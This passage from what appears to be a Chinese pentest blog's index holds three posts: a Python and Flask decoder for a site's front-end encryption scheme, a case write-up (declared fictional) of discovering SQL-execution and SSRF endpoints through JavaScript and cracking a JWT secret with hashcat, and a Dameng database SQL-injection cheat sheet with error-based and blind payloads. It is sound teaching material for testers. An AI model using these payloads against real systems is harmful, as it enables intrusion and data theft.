的值进行判断，若存在且不为空，则拼接上 \"cEe\"，否则拼接上 \"eEc\" result = ''.join(a) if ECOND.get('picture'): return result + \"cEe\" else: return result + \"eEc\" def decode(r): # 移除拼接的后缀 \"cEe\" 或 \"eEc\" if r.endswith(\"cEe\"): r = r[:-3] elif r.endswith(\"eEc\"): r = r[:-3] a = list(r) # 逆向交换数组前半部分中索引为偶数的元素 for t in range(len(a) // 2): if t % 2 == 0: a[t], a[len(a) - 1 - t] = a[len(a) - 1 - t], a[t] # 将数组元素拼接成字符串并进行 Base64 解码 decoded_str = base64decode(''.join(a)) # 将 UTF - 8 编码的字符串转换为 UTF - 16 编码 decoded_str = utf8to16(decoded_str) # 移除拼接的长度为 5 的随机字符串 decoded_str = decoded_str[:-5] return decoded_str def main(): # 定义一个输入字符串 encoded_input = \"hUWWL2VH9Tkiz0pMWNEOPJlcZdtYeEc\" encoded_input = unquote(encoded_input) plain_input = 'helloworld' # 调用 encode 函数进行编码 encoded_output = quote(encode(base64encode(plain_input.encode('utf-8')))) # 调用 decode 函数进行解码 decoded_output = base64decode(decode(encoded_input)).decode('utf-8') # 打印结果 print(f\"输入明文字符串: \\n{plain_input}\") print(f\"编码后的结果: \\n{encoded_output}\") print(f\"\") print(f\"输入编码字符串: \\n{encoded_input}\") print(f\"解码后的结果: \\n{decoded_output}\") if __name__ == \"__main__\": main() ","date":"2025-03-10","objectID":"/posts/002-case_simpleencryptioncase/:2:0","tags":["Pentest","Crypto"],"title":"002-渗透案例：记一次简单前端加密案例","uri":"/posts/002-case_simpleencryptioncase/"},{"categories":["案例分享"],"content":"AutoDecode脚本 在该项目上我使用Burpsuite 配合插件AutoDecode进行测试，因此需要编写AutoDecode相应的加密秘脚本。 注意该脚本未实现 encode 加密模块，decode模块可用 # -*- coding:utf-8 -*- # author: Xavier from flask import Flask,Response,request,jsonify from pyDes import * from urllib.parse import parse_qs, quote, unquote import base64 import chardet import random import string app = Flask(__name__) def randomStr(length): letters = string.ascii_letters return ''.join(random.choice(letters) for i in range(length)) def utf16to8(s): return s.encode('utf-8') def utf8to16(s): return s.decode('utf-8') def base64encode(s): return base64.b64encode(s).decode('utf-8') def base64decode(s): return base64.b64decode(s) # 模拟 $.ECOND.picture ECOND = { 'picture': None } def encode(r): r = r + randomStr(5) encoded_str = base64encode(utf16to8(r)) a = list(encoded_str) for t in range(len(a) // 2): if t % 2 == 0: # 如果当前索引 t 是偶数，交换数组中索引为 t 和 len(a) - 1 - t 的元素 a[t], a[len(a) - 1 - t] = a[len(a) - 1 - t], a[t] result = ''.join(a) if ECOND.get('picture'): return result + \"cEe\" else: return result + \"eEc\" def decode(r): # 移除拼接的后缀 \"cEe\" 或 \"eEc\" if r.endswith(\"cEe\"): r = r[:-3] elif r.endswith(\"eEc\"): r = r[:-3] a = list(r) # 逆向交换数组前半部分中索引为偶数的元素 for t in range(len(a) // 2): if t % 2 == 0: a[t], a[len(a) - 1 - t] = a[len(a) - 1 - t], a[t] decoded_str = base64decode(''.join(a)) decoded_str = utf8to16(decoded_str) decoded_str = decoded_str[:-5] # 移除随机字符串 return decoded_str @app.route('/encode',methods=[\"POST\"]) def encrypt(): …… encry_param += '' return encry_param @app.route('/decode',methods=[\"POST\"]) def decrypt(): form_data = request.form.get('dataBody') # 使用 parse_qs 函数解析表单数据 params_dict = parse_qs(form_data) decrypt_param = '' # 打印提取的键值对 for key, values in params_dict.items(): for value in values: print(f\"Key: {key}, Value: {value}\") # 解密参数 key = base64decode(decode(key)).decode('utf-8') value = base64decode(decode(value)).decode('utf-8') print(f\"Decoded Key: {key}, Decoded Value: {value}\") decrypt_param += key + '=' + value + '\u0026' decrypt_param += '' return decrypt_param if __name__ == '__main__': app.debug = True # 设置调试模式，生产模式的时候要关掉debug app.run(host=\"0.0.0.0\",port=\"8888\") ","date":"2025-03-10","objectID":"/posts/002-case_simpleencryptioncase/:3:0","tags":["Pentest","Crypto"],"title":"002-渗透案例：记一次简单前端加密案例","uri":"/posts/002-case_simpleencryptioncase/"},{"categories":["案例分享"],"content":"最终效果 配置完AutoDecode，启动Python脚本后，最后实现了对数据包的自动加解密，效果如下所示： 解密前： 解密后： ","date":"2025-03-10","objectID":"/posts/002-case_simpleencryptioncase/:4:0","tags":["Pentest","Crypto"],"title":"002-渗透案例：记一次简单前端加密案例","uri":"/posts/002-case_simpleencryptioncase/"},{"categories":["案例分享"],"content":"通过JS分析发现更多漏洞","date":"2025-01-09","objectID":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/","tags":["Pentest"],"title":"001-渗透案例：巧用JS挖掘“宝藏”","uri":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/"},{"categories":["案例分享"],"content":"声明：本文纯属虚构，如有雷同纯属巧合。 ","date":"2025-01-09","objectID":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/:0:0","tags":["Pentest"],"title":"001-渗透案例：巧用JS挖掘“宝藏”","uri":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/"},{"categories":["案例分享"],"content":"背景 一个寻常的工作日，小X 收到任务对 A 集团某系统进行渗透测试，但是不能用自己电脑，需要远控客户电脑进行测试。（因此，以下内容配图都不是原图，~~尽量还原，~~都是虚构的） 连上客户电脑，简单看了下环境，还行，还是有Burpsuite的，不算天崩开局。BP一开，Link start！果然一个标准登录框：账户、密码、图形验证码。 ","date":"2025-01-09","objectID":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/:1:0","tags":["Pentest"],"title":"001-渗透案例：巧用JS挖掘“宝藏”","uri":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/"},{"categories":["案例分享"],"content":"1 - 碰壁 常规思路是对系统进行路径扫描，客户电脑上没有工具，就用 Burp 自带的字典扫描一下，没什么发现。 同时对登录框进行常规测试：弱口令、用户名密码枚举、验证码缺陷等，未复习漏洞。 ","date":"2025-01-09","objectID":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/:2:0","tags":["Pentest"],"title":"001-渗透案例：巧用JS挖掘“宝藏”","uri":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/"},{"categories":["案例分享"],"content":"2 - JS的救赎 接下去对系统前端界面进行分析，通过抓包分析很神奇的事情，这个网站没有明确的.js和.css结尾的文件，怎么会呢，不科学。 分析数据包发现当访问系统域名时，会自动重定向到登录页面，但是这个过程中有个链接是这样的 /include.html?page=/path/login.jsp\u0026type=css\u0026xxx\u0026files=index.css;.../static/xxxx.css; /include.html?page=/path/login.jsp\u0026type=js\u0026xxx\u0026files=index.js;.../static/xxxx.js; 对这个链接进行分析，分析相应功能网页的JS和CSS文件都是通过include.html进行统一加载。 那么这么一个链接，有哪些可能的漏洞呢？ 我在这块测试了文件读取、SSRF等，未发现有效漏洞。 通过上述链接，当 type=js 时，会加载默认的JS文件，再加上所指定JS文件，对该JS进行分析，终于有所收获了。 对JS文件进行扫描，发现了很多接口 虽然有些接口访问是404，但还是有很多接口存在，不过下面这些接口访问401，无法利用。 /common/linkeditor.jsp?parentPage=pagedesigner\u0026url= /admin/upload.htm /admin/deleteTempFile.htm?fileName= 但是也成功找到了一些能够访问的接口，如下： /runSafeScript.htm?sqlId= /runScript.htm /runStoredProcedure.htm /runJavaMethod.htm /runPython.htm /runHttp.htm 对相应接口的JS代码进行分析，成功构造了runScript 和 runHttp 的请求包，并利用成功。 ","date":"2025-01-09","objectID":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/:3:0","tags":["Pentest"],"title":"001-渗透案例：巧用JS挖掘“宝藏”","uri":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/"},{"categories":["案例分享"],"content":"SQL执行 function runSQL(e, t) { ………… $.ajax({ url: getBasePath() + \"/runScript.htm\", type: \"post\", async: !1, data: { script: encodeBase64Twice(i), dataSource: t || \"current\" }, success: function (e) { a = e; }, }) …… } 根据 JS 构造请求包： POST /runScript.htm HTTP/1.1 Host: xxxxxx script={双重Base64的SQL语句}\u0026dataSource=current 使用建议SQL语句select 1; ，select 'a' 探测都成功了，但是 select database()，SELECT banner FROM v$version 等都没执行成功。 在这块花了很多时间，进行漫长的探测，常见的SQL语句都无法成功执行，由于时间紧迫一度打算放弃了。最后想着再试一次，从头整理探测思路判断数据库，最终确定了系统的数据库类型为 Postgresql，而不是前期判断的 MySQL、Oracle、MSSQL、DMSQL。 SQL语句执行成功。 ","date":"2025-01-09","objectID":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/:3:1","tags":["Pentest"],"title":"001-渗透案例：巧用JS挖掘“宝藏”","uri":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/"},{"categories":["案例分享"],"content":"SSRF 再看另一个接口runHttp.htm 的 JS代码 function runHttp(e, t, n, r, i) { $.post( getBasePath() + \"/runHttp.htm\", { url: e, method: t, data: n, header: r }, function (e) { i \u0026\u0026 i(e); } ); } 根据上述 JS 代码可构造如下HTTP请求 POST /runHttp.htm HTTP/1.1 Host: xxxxxxx url=http://xxxxx/statics/xxxx.js\u0026method=get\u0026data=\u0026header= 这块没什么好多说的，构造请求后runHttp 成功，能够实现SSRF探测，向目标URL进行请求并获取其响应内容。 ","date":"2025-01-09","objectID":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/:3:2","tags":["Pentest"],"title":"001-渗透案例：巧用JS挖掘“宝藏”","uri":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/"},{"categories":["案例分享"],"content":"3 - 虚晃的 JWT 在JS中除了上述接口之外，还找到了一条 JWT Token泄露。对于JWT Token 的泄露，直接利用肯定是不行，一般都是过期了的。 这里对 JWT 的 secret Key 进行了枚举，还真是有弱 secret key，通过hashcat进行暴破，示例如下： $ hashcat -m 16500 test.jwt.hash ./jwt.secrets.list --force --quiet --show eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYmYiOjE2NzU5MTAwNjcsInVzZXJpZCI6ImZhMTIzMDZlLTEwYmMtNGYyNS1hNWU3LWY2NDIyNWJhMzAyNCIsImV4cCI6MTY3NTk1MDA2NywiaWF0IjoxNjc1OTEwMDY3LCJ1c2VybmFtZSI6Inh4eHhkZW1vMSJ9.xpqoFsaqwBcpYuslV5BvjWpWPH31fExNoDcE-gbryKs:123456 后续尝试利用该secret key进行 JWT 伪造，但是没有利用成功。说明当前系统的secret key很可能已经变更了。 不过通过这个JWT解码后，获取到了用户名xxxxdemo1 后续可以尝试用户名密码枚举，不过当前环境下没有这个条件。 ","date":"2025-01-09","objectID":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/:4:0","tags":["Pentest"],"title":"001-渗透案例：巧用JS挖掘“宝藏”","uri":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/"},{"categories":["案例分享"],"content":"后续 后续客户给我们提供了测试账户，后面的测试就比较正常了。不过不知道是不是因为测试账号权限比较低，反正所提供的账户是没有之前发现的SQL执行和SSRF的接口的。 所以还是要关注 JS文件中的信息，能有效扩展我们的攻击面，也许会有意外之喜。 最后祝大家工作顺利，Have a nice day! ","date":"2025-01-09","objectID":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/:5:0","tags":["Pentest"],"title":"001-渗透案例：巧用JS挖掘“宝藏”","uri":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/"},{"categories":["Pentest"],"content":" DMSQL注入小记，转手存为笔记，辅助日常工作。麻烦大家也点点原文链接，欢迎大家点赞评论。 原文首发在：先知社区 https://xz.aliyun.com/t/16721 ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:0:0","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"达梦数据库DMSQL-SQL注入小记 目前国产化越来越普及，平时遇到的达梦数据库也越来越多，因此决定进行下总结。由于本人能力有限，如果文章中有纰漏欢迎指正，也欢迎大家进行交流。 官方存在达梦线上实验室，可以在线试用达梦数据库，免注册，省去了自己下载安装的时间。 https://eco.dameng.com/tour/ ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:1:0","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x01 判断DMSQL 常见的判断方法如下： 报错语句： dm.jabc.driver.DMException 无 updatexml 等方法， ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:2:0","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x02 基础语法 select user -- 返回当前用户，默认是SYSDBA select user() -- 同上 select cur_database -- 返回当前库名，默认是DAMENG select cur_database() -- 同上 select 1 -- select语句后面可以不跟表名，存在默认表dual，可以接from dual select 1 from dual where 1=1 \u0026\u0026 1=1 -- \u0026\u0026可以代替and，但||不能代替or ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:3:0","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"2.1 注释 SELECT 1; -- 单行注释 select 1/*aaa*/from dual -- 支持/**/多行注释 不支持 # 单行注释 和/*! */内联注释 ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:3:1","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"2.2 常用运算符 DMSQL程序数据库类型与操作符 常用运算符差异不大，\u0026\u0026 同 AND，但 || 无法代替 OR。 ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:3:2","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x03 函数特性 md5(1) -- 返回 0xC4CA4238A0B923820DCC509A6F75849B，返回对应MD5值，前面加了0x exp(if(1=1,710,1)) exp(710) -- 返回整数溢出错误，使用这种方式可以强制BOOL盲注 ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:4:0","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"3.1 进制转换 ASCII(str) 返回字符串第一个字符的ASCII值, ASCII('a') = 97 char(num) 返回参数num对应的ASCII字符， chr(num) 同上，CHR(97) = a HEX(str) 返回16进制字符串形式, hex(12) = 3132 UNHEX(str) 返回对应的字符串，unhex(3132) = 12 ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:4:1","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"3.2 字符串截取 substring('1234',2,1) -- 同substr函数 substr('1234',2,1) -- 返回2，第二个参数从第几位开始取值，第三个参数代表截图多少位 -- 多种格式 SUBSTR(str,pos)、SUBSTR(str FROM pos)、SUBSTR(str,pos,len)、SUBSTR(str FROM pos FOR len), 如 substr('1234' from 2 for 1) = 2 left('123456', 3) -- 返回123，第二个参数代表返回左边几位的字符 right('123456', 3) -- 返回456，第二个参数代表返回右边几位的字符 ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:4:2","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"3.3 字符串拼接 || -- 将左右两侧字符串进行连接 CONCAT(str1,str2...) -- 将多个字符串合并为一个字符串 CONCAT_WS(separator,str1,str2...) -- 通过分隔符separator将字符串连接在一起 WM_CONCAT(column_name) -- 类似 GROUP_CONCAT(...)，将某一列中的多个字符串按照一定顺序拼接成一个大的字符串，通常用于分组后的字符串拼接 LISTAGG(column_name, separator) -- 和 WM_CONCAT 类似，也是用于将分组后的列值进行拼接，并且提供了更多的控制选项，如指定分隔符等。 ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:4:3","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"3.4 其他 LENGTH(str) -- 返回字符串的长度 len(str) -- 返回字符串的长度 LOWER(str) -- 将字符串字母全部转成小写。同：LCASE(str)。 UPPER(str) -- 将字符串字母全部转成大写。同：UCASE(str)。 TO_CHAR(date/time_value, 'format') -- 将日期、时间、数字等类型的数据转换为字符类型 TO_NUMBER(char_value, 'format') -- 将字符类型的数据转换为数字类型 TO_DATE(char_value, 'format') -- 将字符类型的数据转换为日期类型。 ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:4:4","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x04 SQLi 获取数据 注入方式整体上和Oracle差不多，但是还是有一些区别。 注入语句： ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:5:0","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"4.1 基本信息 -- 查看数据库版本 SELECT banner FROM v$version; -- 注意：返回是多行 SELECT banner FROM v$version limit 0,1; SELECT WM_CONCAT(banner) FROM v$version -- 在一行中显示 SELECT LISTAGG(banner, '， ') FROM v$version; -- 在一行中显示，高版本可用 -- 获取当前用户、当前数据库 select user select user() SELECT user FROM DUAL; select cur_database -- 获取所有用户名 select USERNAME from SYS.ALL_USERS select WM_CONCAT(USERNAME) from SYS.ALL_USERS ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:5:1","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"4.2 查询全局变量 需要当前用户具备查询权限 SELECT NAME, TYPE, VALUE FROM V$PARAMETER; NAME列显示系统参数的名称，如BUFFER_POOL_SIZE（缓冲池大小）等，这些参数名称用于标识不同的数据库配置项。 TYPE列表示参数的类型，例如INT（整数类型）、STRING（字符串类型）等，这有助于了解参数值的数据格式。 VALUE列则是对应的参数实际的值，例如对于BUFFER_POOL_SIZE参数，VALUE列可能显示一个表示大小的数字（单位可能根据参数定义而不同）。 常见有用的全局变量如下： NAME VALUE SYSTEM_PATH /home/dmdba/data/DAMENG CONFIG_PATH /home/dmdba/data/DAMENG TEMP_PATH /home/dmdba/data/DAMENG BAK_PATH /home/dmdba/data/DAMENG/bak DFS_PATH $/DAMENG INSTANCE_NAME DMSERVER INSTANCE_ADDR PORT_NUM 5236 SVR_LOG_NAME SLOG_ALL TRACE_PATH /home/dmdba/data/DAMENG/trace BCT_PATH /home/dmdba/data/DAMENG 如果只想查询特定的全局变量，可以在查询语句中添加筛选条件。 查询语句： SELECT VALUE FROM V$PARAMETER WHERE NAME = 'SYSTEM_PATH'; SELECT NAME, VALUE FROM V$PARAMETER WHERE name LIKE '%INSTANCE%' ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:5:2","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"4.3 查询系统表 1） 查询库名 SYS.SYSOBJECTS表中保存全部的库名信息。 查询所有的库名和对应ID select NAME,ID from SYS.SYSOBJECTS where TYPE$='SCH' 2） 查询表名 SYS.SYSOBJECTS 表中同时保存全部的表名信息。 查询所有的表名。其中SCHID来自步骤1）中获得的ID select NAME,ID from SYS.SYSOBJECTS where TYPE$='SCHOBJ' and SUBTYPE$='UTAB' and SCHID=150995949 3） 查询列名 SYS.SYSCOLUMNS 表中字段名称和字段类型。 查询所有表对应的列名。其中ID为步骤2）中获取的ID select NAME,TYPE$,DEFVAL from SYS.SYSCOLUMNS where ID=1078 ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:5:3","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"4.4 查询视图 1） 查询用户 查询全部数据库的用户名 select USERNAME from SYS.ALL_USERS 2） 查询库名 查询全部库名，其中 OWNER 是步骤1）对应的数据库用户名。 select OBJECT_NAME from SYS.ALL_OBJECTS where OWNER='SYSDBA' and OBJECT_TYPE='SCH' 3） 查询表名 查询全部表名， OWNER 是步骤2）对应的库名。 select OBJECT_NAME from SYS.ALL_OBJECTS where OWNER='OTHER' and OBJECT_TYPE='TABLE' 4） 查询列名 可以使用下面的方式返回指定条件对应的列名，其中SCHEMA_NAME代表库名，TABLE_NAME代表表名。 select OWNER,TABLE_NAME,SCHEMA_NAME,COLUMN_NAME from SYS.ALL_COL_COMMENTS where SCHEMA_NAME='OTHER' and TABLE_NAME='xxxxxx' ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:5:4","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x05 联合查询注入 Union 注入与常规的没什么区别 order by num union select 1,2,3... -- 注意列数和类型要相同 ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:6:0","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x06 报错注入 常规的报错函数都不太行，无法直接获取结果。主要利用的是 除0错误、溢出错误，结合布尔注入进行。 ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:7:0","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"6.1 除0错误 select 1 from dual where 1=1/0 结合布尔注入进行探测 SELECT * FROM t1 where rownum\u003c5 AND 1=1 AND 1=1/if(len(user)=6,1,0) ORDER BY id DESC; ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:7:1","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"6.2 溢出错误 select exp(710) select exp(if(1=1,710,1)) -- 数据溢出 select exp(if(len(user)=6,710,1)) SELECT * FROM t1 where rownum\u003c5 AND 1=exp(if(len(user)=6,710,0)) ORDER BY id DESC; SELECT * FROM t1 where rownum\u003c5 ORDER BY id,exp(if(len(user)=6,711,0)) DESC; SELECT * FROM t1 where rownum\u003c5 ORDER BY id DESC, exp(if(len(user)=6,710,0)); ","date":"2024-12-17","objectID":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/:7:2","tags":["SQLi"],"title":"达梦数据库DMSQL-SQL注入小记","uri":"/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/"},{"categories":["Pentest"],"content":"0x07 布尔盲注 布尔盲注语法 if(expr，参数1，参数2) -- expr成立时，返回参数1的值;不成立时，返回参数2的值 CASE WHEN exp THEN state1 